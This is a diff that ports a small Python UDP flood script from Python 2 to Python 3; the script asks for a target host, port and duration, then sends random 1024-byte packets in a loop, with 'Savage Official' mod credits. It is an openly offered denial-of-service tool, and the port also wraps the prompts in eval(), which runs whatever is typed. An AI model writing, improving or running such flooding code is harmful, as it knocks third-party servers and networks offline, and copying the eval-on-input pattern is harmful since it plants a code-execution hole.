@@ -2,22 +2,22 @@ import socket, sys, os, time, itertools, threading, random, console
 def credits():
 	import console
 	console.set_color(130, 0, 0)
-	print "\n     -+--=:=-  -++-  -=:=--+-"
+	print("\n     -+--=:=-  -++-  -=:=--+-")
 	console.set_color()
 	console.set_font('HoeflerText-Black')
-	print " " * 22 + "Base: NetArrivals Team"
-	print " " * 25 + "Mod: Savage Official"
+	print((" " * 22 + "Base: NetArrivals Team"))
+	print((" " * 25 + "Mod: Savage Official"))
 	console.set_font()
 	console.set_color(130, 0, 0)
-	print "     -+--=:=-  -++-  -=:=--+-\n"
+	print("     -+--=:=-  -++-  -=:=--+-\n")
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1024) * int(sys.argv[1])
 credits()
-victim = raw_input(' -+- Target: ')
-vport = input(' -+- Port: ')
-duration = input(' -+- Run: ')
+victim = eval(input(' -+- Target: '))
+vport = eval(input(' -+- Port: '))
+duration = eval(input(' -+- Run: '))
 console.set_color()
-print ""
+print("")
 timeout = time.time() + duration
 sent = 0
 while 1:
@@ -32,4 +32,6 @@ while 1:
 	except:
 		pass
 	sent = sent + 1
-	print "%s Packets: %s Port: %s "%(sent, victim, vport)
+	print(("%s Packets: %s Port: %s "%(sent, victim, vport)))
+
+
